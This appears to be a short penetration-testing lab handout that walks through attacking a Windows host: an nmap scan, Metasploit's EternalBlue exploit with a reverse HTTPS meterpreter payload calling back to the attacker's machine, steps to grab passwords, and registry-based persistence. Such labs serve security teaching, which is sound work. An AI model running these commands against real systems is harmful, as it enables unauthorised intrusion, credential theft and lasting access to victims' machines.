
*****************
Lab 3 - Attacking
*****************

In this lab we’ll walk through a simple exploitation of a system from
start to finish. Some of the steps discussed on the attacker methodology
will be skipped due to restrictions of the example.

Steps
=====

1. Scan the target machine using nmap. 
   
   ::

    nmap -sT -sV -Pn -n -T4 <ip address>


2. Exploit the target using Metasploit. 
   
   ::

    msfconsole -q

a. Select exploit. 
   
   ::

    use exploit/windows/smb/ms17_010_eternalblue

b. Set options. 

   ::

    set rhost <ip address>

c. Set payload. 

   ::

    set payload windows/x64/meterpreter/reverse_https

d. Set options. 

   ::

    set lhost <local ip address>

    set lport 443

e. Exploit! 

   ::

    exploit

3. Internal reconnaissance

   a. Check which user

   b. Check where we landed on the filesystem

   c. Grab passwords

   d. Etc.

4. Setup persistence

   a. Registry key

  ::

   use exploit/windows/local/registry_persistence

b. Set session (where our exploit was) 

   ::

    set session 1

c. Exploit! 

   ::

    exploit
